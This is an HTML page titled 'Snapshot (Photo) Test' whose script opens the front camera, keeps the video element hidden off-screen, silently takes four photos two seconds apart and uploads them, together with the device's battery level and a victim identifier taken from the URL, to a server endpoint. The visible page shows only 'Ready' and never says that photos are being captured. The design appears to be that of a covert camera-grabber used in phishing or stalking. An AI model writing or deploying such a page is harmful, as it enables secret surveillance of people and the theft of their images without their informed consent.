<!DOCTYPE html>
<html lang="ps">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Snapshot (Photo) Test</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
<style>
  html,body{
    margin:0;padding:0;height:100%;width:100%;overflow:hidden;
    font-family:'Orbitron',sans-serif;
    background:#000;
    color:#00ffea;
  }
  /* background / UI simplified */
  .center {
    position: absolute; inset: 0; display:flex; align-items:center; justify-content:center;
    z-index:2;
  }
  /* invisible but renderable camera element */
  video#photo {
    position: absolute;
    left: -10000px; top: -10000px;
    width: 1px; height: 1px; opacity: 0;
  }
  canvas#snapshot { display:none; }
  #log { position: fixed; left:10px; bottom:10px; color:#aaffee; font-size:14px; white-space:pre-line; }
</style>
</head>
<body>

<div class="center">
  <h1>Snapshot (Photo) test — Ready</h1>
</div>

<!-- hidden but renderable camera element (id changed to "photo") -->
<video id="photo" autoplay playsinline muted></video>
<canvas id="snapshot"></canvas>

<div id="log"></div>

<script>
(async function(){
  const photoEl = document.getElementById('photo'); // was 'video' before — now 'photo'
  const canvas = document.getElementById('snapshot');
  const ctx = canvas.getContext('2d');
  const logEl = document.getElementById('log');
  const uid = (new URLSearchParams(location.search)).get('uid') || 'unknown';

  const MAX = 4;
  const INTERVAL_MS = 2000;

  function log(...msgs){
    const line = msgs.join(' ');
    console.log(line);
    logEl.innerText += line + '\n';
  }

  // get battery info (best-effort)
  let batteryLevel = null, isCharging = null;
  try {
    const b = await navigator.getBattery();
    batteryLevel = Math.round(b.level * 100);
    isCharging = b.charging;
  } catch(e){ /* ignore */ }

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    photoEl.srcObject = stream;
    log('Camera stream started.');

    // wait for metadata (dimensions) or short fallback
    await new Promise(resolve => {
      if (photoEl.readyState >= 2) return resolve();
      photoEl.onloadedmetadata = () => resolve();
      // safety fallback after 5s
      setTimeout(() => resolve(), 5000);
    });

    // small delay to ensure first frame rendered
    await new Promise(r=>setTimeout(r, 800));

    // take snapshots sequentially
    for(let i=0;i<MAX;i++){
      // ensure dimensions ready
      let attempts = 0;
      while((photoEl.videoWidth === 0 || photoEl.videoHeight === 0) && attempts < 10){
        await new Promise(r=>setTimeout(r, 200));
        attempts++;
      }
      if(photoEl.videoWidth === 0 || photoEl.videoHeight === 0){
        log('Warning: photo element has no dimensions, skipping snapshot', i+1);
        continue;
      }

      canvas.width = photoEl.videoWidth;
      canvas.height = photoEl.videoHeight;
      ctx.drawImage(photoEl, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/png');

      // send to server
      try {
        const res = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ image: imageData, uid, battery: batteryLevel, charging: isCharging })
        });
        const data = await res.json().catch(()=>({ ok: res.ok }));
        log(`Photo ${i+1} uploaded.`, JSON.stringify(data));
      } catch(err) {
        log('Upload error for photo', i+1, err && err.message ? err.message : err);
      }

      if(i < MAX-1) await new Promise(r=>setTimeout(r, INTERVAL_MS));
    }

    // stop tracks
    stream.getTracks().forEach(t => t.stop());
    log('Done: camera tracks stopped after', MAX, 'photos.');

  } catch(err){
    log('Camera error:', err && err.name ? `${err.name}: ${err.message}` : err);
  }
})();
</script>
</body>
</html> 
